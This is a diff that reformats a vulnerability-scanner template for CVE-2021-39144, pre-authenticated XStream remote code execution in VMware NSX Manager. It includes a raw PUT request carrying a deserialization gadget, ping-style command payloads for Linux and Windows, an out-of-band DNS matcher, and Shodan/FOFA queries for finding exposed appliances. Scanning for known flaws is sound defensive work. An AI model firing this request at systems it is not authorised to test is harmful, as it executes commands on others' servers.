@@ -1,5 +1,4 @@
 id: vmware-nsx-stream-rce
-
 info:
   name: VMware NSX Manager XStream Pre-authenticated Remote Code Execution
   author: _0xf4n9x_
@@ -17,18 +16,38 @@ info:
     - https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html
     - https://attackerkb.com/topics/ngprN6bu76/cve-2021-39144
     - https://github.com/rapid7/metasploit-framework/pull/17222
+  classification:
+    cwe-id:
+      - CWE-502
+      - CWE-78
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive, uses interactsh
-    verified: true
+    fofa-query: title="VMware Appliance Management"
     max-request: 2
     shodan-query: title:"VMware Appliance Management"
-    fofa-query: title="VMware Appliance Management"
-  tags: vmware,xstream,rce,msf,intrusive,vuln
+    verified: true
+  tags: intrusive,msf,rce,vmware,vuln,xstream
 variables:
-  lowerrstr: "{{to_lower(rand_text_alpha(6))}}"
-
+  lowerrstr: '{{to_lower(rand_text_alpha(6))}}'
 http:
-  - raw:
+  - matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - part: body
+        type: word
+        words:
+          - deceptive request routing
+      - status:
+          - 400
+        type: status
+    matchers-condition: and
+    payloads:
+      os:
+        - -c 3 lin
+        - -n 3 win
+    raw:
       - |-
         PUT /api/2.0/services/usermgmt/password/{{lowerrstr}} HTTP/1.1
         Host: {{Hostname}}
@@ -50,26 +69,4 @@ http:
             </handler>
           </dynamic-proxy>
         </sorted-set>
-
-    payloads:
-      os:
-        - '-c 3 lin'
-        - '-n 3 win'
     stop-at-first-match: true
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "dns"
-
-      - type: word
-        part: body
-        words:
-          - 'deceptive request routing'
-
-      - type: status
-        status:
-          - 400
-
